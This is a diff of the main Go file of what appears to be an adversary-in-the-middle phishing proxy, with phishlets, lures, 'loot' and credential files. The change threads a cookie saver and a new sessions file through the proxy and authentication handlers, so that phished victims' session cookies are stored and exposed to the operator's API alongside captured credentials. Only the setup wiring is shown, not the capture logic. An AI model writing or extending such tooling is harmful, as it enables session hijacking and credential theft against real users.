@@ -60,7 +60,8 @@ func setupRequestProcessor(conv DomainConverter) RequestProcessor {
 	return NewRequestProcessor(conv, requestURLProc)
 }
 
-func setupResponseProcessor(conf *appConfig, conv DomainConverter) ResponseProcessor {
+func setupResponseProcessor(conf *appConfig, conv DomainConverter,
+	cookieSaver CookieSaver) ResponseProcessor {
 	baseScript := fmt.Sprintf(`
 	var baseDomain = "%s"
 	var apiURL = "https://%s"`, conf.DomainNameWithPort, conf.APIHostname)
@@ -71,19 +72,20 @@ func setupResponseProcessor(conf *appConfig, conv DomainConverter) ResponseProce
 	responseURLProc := newURLRegexProcessor(func(domain string) string {
 		return conv.ToProxyDomain(domain)
 	})
-	return NewResponseProcessor(conv, responseURLProc, htmlProc)
+	return NewResponseProcessor(conv, responseURLProc, htmlProc, cookieSaver)
 }
 
-func setupProxyHandler(conf *appConfig, conv DomainConverter) fiber.Handler {
+func setupProxyHandler(conf *appConfig, conv DomainConverter, cookieSaver CookieSaver) fiber.Handler {
 	client := setupHTTPClient()
 	req := setupRequestProcessor(conv)
-	resp := setupResponseProcessor(conf, conv)
+	resp := setupResponseProcessor(conf, conv, cookieSaver)
 	return NewProxyHandler(client, req, resp)
 }
 
-func setupAuthHandler(conf *appConfig, conv DomainConverter, lureService LureService) fiber.Handler {
+func setupAuthHandler(conf *appConfig, conv DomainConverter, lureService LureService,
+	lootService *lootService) fiber.Handler {
 	cookieManager := NewCookieManager()
-	storage := NewSessionStorage(memory.New(), cookieManager)
+	storage := NewSessionStorage(memory.New(), cookieManager, lootService)
 	store := session.New(session.Config{
 		Expiration:     conf.SessionExpiration,
 		KeyLookup:      "cookie:" + conf.SessionCookieName,
@@ -164,7 +166,17 @@ func main() {
 	}
 	defer credsFile.Close()
 	lootRepo := NewFileLootRepository(credsFile)
-	lootService := NewLootService(lootRepo)
+
+	sessionsFile, err := os.OpenFile(conf.SessionsFile, os.O_WRONLY|os.O_APPEND|os.O_CREATE, 0644)
+	if err != nil {
+		log.Println(err)
+		return
+	}
+	defer sessionsFile.Close()
+	sessionRepo := NewFileSessionRepository(sessionsFile)
+	lootService := NewLootService(lootRepo, sessionRepo, conf.Phishlet.SessionCookies)
+	cookieService := NewCookieService()
+	cookieSaver := NewMultiCookieSaver(cookieService, lootService)
 
 	conv := setupDomainConverter(conf)
 	lureService, err := NewLureService(&FileByteSource{conf.LuresFile})
@@ -172,7 +184,7 @@ func main() {
 		log.Println(err)
 		return
 	}
-	auth := setupAuthHandler(conf, conv, lureService)
+	auth := setupAuthHandler(conf, conv, lureService, lootService)
 	api := NewAPIMiddleware(APIConfig{
 		APIHostname:     conf.APIHostname,
 		APIToken:        conf.APIToken,
@@ -180,8 +192,9 @@ func main() {
 		AuthHandler:     auth,
 		LootService:     lootService,
 		LureService:     lureService,
+		CookieSaver:     cookieSaver,
 	})
-	proxy := setupProxyHandler(conf, conv)
+	proxy := setupProxyHandler(conf, conv, cookieSaver)
 
 	app := setupApp(api, auth, proxy)
 	if err := app.ListenTLS(conf.ListenAddr, conf.TLSCert, conf.TLSKey); err != nil {
